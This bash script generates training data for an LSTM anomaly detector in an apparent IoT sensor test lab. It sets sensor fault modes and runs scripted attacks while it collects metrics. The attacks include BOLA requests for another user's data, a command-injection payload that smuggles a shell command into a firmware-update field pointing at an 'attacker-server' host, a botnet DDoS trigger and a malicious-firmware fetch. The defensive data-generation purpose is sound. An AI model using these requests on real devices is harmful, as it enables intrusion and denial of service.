#!/bin/bash

# lstm_dataset_generator.sh - Generate comprehensive datasets for LSTM model training and testing
# This script combines normal operation data with various attack types
# to create a dataset suitable for LSTM model validation

# Default configuration
SENSOR_HOST="localhost"
SENSOR_PORT="12384"
PROMETHEUS_URL="http://localhost:9090"
OUTPUT_DIR="datasets/lstm_training"
DURATION=60          # Duration for each collection (seconds)
COOLDOWN=30          # Cooldown between collections
FAULT_TYPES=("none" "stuck" "drift" "spike" "dropout")
ATTACK_TYPES=("bola" "ddos" "cmd_injection" "resource_exhaustion")

# Command line arguments
while [[ $# -gt 0 ]]; do
  case $1 in
    --sensor)
      SENSOR_HOST="$2"
      shift 2
      ;;
    --port)
      SENSOR_PORT="$2"
      shift 2
      ;;
    --prometheus)
      PROMETHEUS_URL="$2"
      shift 2
      ;;
    --output)
      OUTPUT_DIR="$2"
      shift 2
      ;;
    --duration)
      DURATION="$2"
      shift 2
      ;;
    --cooldown)
      COOLDOWN="$2"
      shift 2
      ;;
    --faults)
      IFS=',' read -ra FAULT_TYPES <<< "$2"
      shift 2
      ;;
    --attacks)
      IFS=',' read -ra ATTACK_TYPES <<< "$2"
      shift 2
      ;;
    --help)
      echo "Usage: $0 [options]"
      echo "Options:"
      echo "  --sensor HOST        Sensor hostname/IP (default: localhost)"
      echo "  --port PORT          Sensor port (default: 12384)"
      echo "  --prometheus URL     Prometheus URL (default: http://localhost:9090)"
      echo "  --output DIR         Output directory (default: datasets/lstm_training)"
      echo "  --duration SEC       Duration for each collection (default: 60)"
      echo "  --cooldown SEC       Cooldown between collections (default: 30)"
      echo "  --faults TYPES       Comma-separated list of fault types (default: none,stuck,drift,spike,dropout)"
      echo "  --attacks TYPES      Comma-separated list of attack types (default: bola,ddos,cmd_injection,resource_exhaustion)"
      exit 0
      ;;
    *)
      echo "Unknown option: $1"
      exit 1
      ;;
  esac
done

# Create output directory
mkdir -p "$OUTPUT_DIR"
echo "Datasets will be saved to: $OUTPUT_DIR"

# Create a metadata file
META_FILE="$OUTPUT_DIR/lstm_dataset_meta_$(date +%Y%m%d_%H%M%S).json"
echo "{" > "$META_FILE"
echo "  \"dataset_type\": \"lstm_training_data\"," >> "$META_FILE"
echo "  \"created_at\": \"$(date -Iseconds)\"," >> "$META_FILE"
echo "  \"sensor_host\": \"$SENSOR_HOST\"," >> "$META_FILE"
echo "  \"sensor_port\": \"$SENSOR_PORT\"," >> "$META_FILE"
echo "  \"scenarios\": [" >> "$META_FILE"

# Utility function to set sensor fault mode
set_fault_mode() {
    local sensor_host=$1
    local sensor_port=$2
    local fault_type=$3
    
    echo "Setting fault mode to: $fault_type"
    
    # Determine payload based on fault type
    if [ "$fault_type" == "none" ]; then
        payload='{"fault_mode": "none"}'
    elif [ "$fault_type" == "stuck" ]; then
        payload='{"fault_mode": "stuck"}'
    elif [ "$fault_type" == "drift" ]; then
        payload='{"fault_mode": "drift"}'
    elif [ "$fault_type" == "spike" ]; then
        payload='{"fault_mode": "spike"}'
    elif [ "$fault_type" == "dropout" ]; then
        payload='{"fault_mode": "dropout"}'
    else
        echo "Unknown fault type: $fault_type"
        return 1
    fi
    
    # Send request to set fault mode
    response=$(curl -s -X POST \
      "http://$sensor_host:$sensor_port/simulate/fault" \
      -H 'Content-Type: application/json' \
      -H 'accept: application/json' \
      -u admin:admin \
      -d "$payload")
    
    echo "Fault mode set response: $response"
    
    # Sleep to allow fault to take effect
    sleep 5
    
    return 0
}

# Execute BOLA attack
execute_bola_attack() {
    local gateway_host="192.168.1.109"  # Default, modify if needed
    local gateway_port="48080"          # Default, modify if needed
    local iterations=$1
    local delay=$2
    
    echo "Executing BOLA attack (accessing premium user data)"
    
    for ((i=1; i<=$iterations; i++)); do
        echo "BOLA attack iteration $i/$iterations"
        
        # Execute BOLA exploitation
        response=$(curl -s -X GET \
          "http://$gateway_host:$gateway_port/users/premium_user/sensors" \
          -H 'accept: application/json')
          
        # Extract and display a small sample of the response
        echo "Response preview: ${response:0:100}..."
        
        # Simulate continuous exploitation
        if [ $i -lt $iterations ]; then
            sleep $delay
        fi
    done
}

# Execute command injection attack
execute_cmd_injection() {
    local sensor_host=$1
    local sensor_port=$2
    local iterations=$3
    local delay=$4
    
    echo "Executing command injection attack"
    
    for ((i=1; i<=$iterations; i++)); do
        echo "Command injection attack iteration $i/$iterations"
        
        # Execute command injection attack
        response=$(curl -s -X POST \
          "http://$sensor_host:$sensor_port/firmware/update" \
          -H 'Content-Type: application/json' \
          -H 'accept: application/json' \
          -u admin:admin \
          -d '{"firmware_url":"http://attacker-server:63999/dummy.sh", "version":"1.2.3", "params":"; echo ATTACK_TEST_$(date +%s) > /tmp/attack_test.txt"}')
          
        echo "Response: $response"
        
        if [ $i -lt $iterations ]; then
            sleep $delay
        fi
    done
}

# Execute DDoS attack
execute_ddos_attack() {
    local sensor_host=$1
    local sensor_port=$2
    local target_host="victim-server"
    local target_port="80"
    local attack_type="http"
    local duration=$3
    
    echo "Executing DDoS attack from sensor"
    
    # Trigger DDoS attack
    response=$(curl -s -X POST \
      "http://$sensor_host:$sensor_port/botnet/attack" \
      -H 'Content-Type: application/json' \
      -H 'accept: application/json' \
      -u admin:admin \
      -d "{\"target\": \"$target_host:$target_port\", \"duration\": $duration, \"type\": \"$attack_type\"}")
    
    echo "DDoS attack response: $response"
}

# Execute resource exhaustion attack
execute_resource_exhaustion() {
    local sensor_host=$1
    local sensor_port=$2
    
    echo "Executing resource exhaustion attack"
    
    # Trigger resource exhaustion via malicious firmware
    response=$(curl -s -X POST \
      "http://$sensor_host:$sensor_port/firmware/update" \
      -H 'Content-Type: application/json' \
      -H 'accept: application/json' \
      -u admin:admin \
      -d '{"firmware_url": "http://malicious-firmware-server:38888/severe_firmware.sh", "version": "1.2.3-SEVERE"}')
    
    echo "Resource exhaustion attack response: $response"
}

# Function to collect normal operation data
collect_normal_data() {
    local fault_type=$1
    local output_subdir="$OUTPUT_DIR/normal_${fault_type}"
    local scenario_json="{"
    
    mkdir -p "$output_subdir"
    
    echo "Collecting normal operation data with $fault_type fault..."
    
    # Set the fault mode
    set_fault_mode "$SENSOR_HOST" "$SENSOR_PORT" "$fault_type"
    
    # Collect data
    data_file="${output_subdir}/normal_${fault_type}_$(date +%Y%m%d_%H%M%S).jsonl"
    
    python3 data_collector.py \
        --event "normal_${fault_type}" \
        --duration "$DURATION" \
        --interval 1 \
        --prometheus "$PROMETHEUS_URL" \
        --output "$output_subdir"
    
    # Get the most recent file
    data_file=$(ls -t "${output_subdir}/normal_${fault_type}"*.jsonl | head -1)
    
    # Update scenario JSON
    scenario_json+="\"type\": \"normal\","
    scenario_json+="\"fault_type\": \"${fault_type}\","
    scenario_json+="\"data_file\": \"${data_file}\","
    scenario_json+="\"duration\": ${DURATION}"
    scenario_json+="}"
    
    # Add to metadata file
    echo "    ${scenario_json}," >> "$META_FILE"
    
    # Reset fault mode
    set_fault_mode "$SENSOR_HOST" "$SENSOR_PORT" "none"
    
    return 0
}

# Function to collect attack data
collect_attack_data() {
    local attack_type=$1
    local fault_type=$2
    local output_subdir="$OUTPUT_DIR/${attack_type}_${fault_type}"
    local scenario_json="{"
    
    mkdir -p "$output_subdir"
    
    echo "Collecting data for $attack_type attack with $fault_type fault..."
    
    # Set the fault mode
    set_fault_mode "$SENSOR_HOST" "$SENSOR_PORT" "$fault_type"
    
    # Start data collection in background
    python3 data_collector.py \
        --event "${attack_type}_${fault_type}" \
        --duration "$DURATION" \
        --interval 1 \
        --prometheus "$PROMETHEUS_URL" \
        --output "$output_subdir" &
    
    COLLECTOR_PID=$!
    echo "Data collector running with PID $COLLECTOR_PID"
    
    # Wait briefly to ensure data collector has started
    sleep 5
    
    # Execute the appropriate attack
    case "$attack_type" in
        "bola")
            num_iterations=$((DURATION / 10))  # Run roughly every 10 seconds
            execute_bola_attack $num_iterations 8
            ;;
        "cmd_injection")
            num_iterations=$((DURATION / 15))  # Run roughly every 15 seconds
            execute_cmd_injection "$SENSOR_HOST" "$SENSOR_PORT" $num_iterations 10
            ;;
        "ddos")
            execute_ddos_attack "$SENSOR_HOST" "$SENSOR_PORT" $((DURATION - 10))
            ;;
        "resource_exhaustion")
            execute_resource_exhaustion "$SENSOR_HOST" "$SENSOR_PORT"
            ;;
        *)
            echo "Unknown attack type: $attack_type"
            kill $COLLECTOR_PID
            return 1
            ;;
    esac
    
    # Wait for data collection to complete
    echo "Waiting for data collection to complete..."
    wait $COLLECTOR_PID
    
    # Get the most recent file
    data_file=$(ls -t "${output_subdir}/${attack_type}_${fault_type}"*.jsonl | head -1)
    
    # Update scenario JSON
    scenario_json+="\"type\": \"${attack_type}\","
    scenario_json+="\"fault_type\": \"${fault_type}\","
    scenario_json+="\"data_file\": \"${data_file}\","
    scenario_json+="\"duration\": ${DURATION}"
    scenario_json+="}"
    
    # Add to metadata file
    echo "    ${scenario_json}," >> "$META_FILE"
    
    # Reset fault mode
    set_fault_mode "$SENSOR_HOST" "$SENSOR_PORT" "none"
    
    return 0
}

# Main execution
echo "Starting LSTM dataset generation..."

# First, collect normal operation data for each fault type
for fault_type in "${FAULT_TYPES[@]}"; do
    collect_normal_data "$fault_type"
    
    # Cooldown between collections
    echo "Cooling down for $COOLDOWN seconds..."
    sleep $COOLDOWN
done

# Then, collect attack data for each attack type and fault type combination
for attack_type in "${ATTACK_TYPES[@]}"; do
    for fault_type in "${FAULT_TYPES[@]}"; do
        collect_attack_data "$attack_type" "$fault_type"
        
        # Cooldown between collections
        echo "Cooling down for $COOLDOWN seconds..."
        sleep $COOLDOWN
    done
done

# Finalize metadata file (remove trailing comma)
sed -i '$ s/,$//' "$META_FILE"
echo "  ]" >> "$META_FILE"
echo "}" >> "$META_FILE"

echo "====================================================="
echo "LSTM dataset collection complete!"
echo "====================================================="
echo "Metadata file: $META_FILE"
echo ""
echo "To process this data for LSTM, run:"
echo "python3 lstm_dataset_processor.py --metadata $META_FILE"
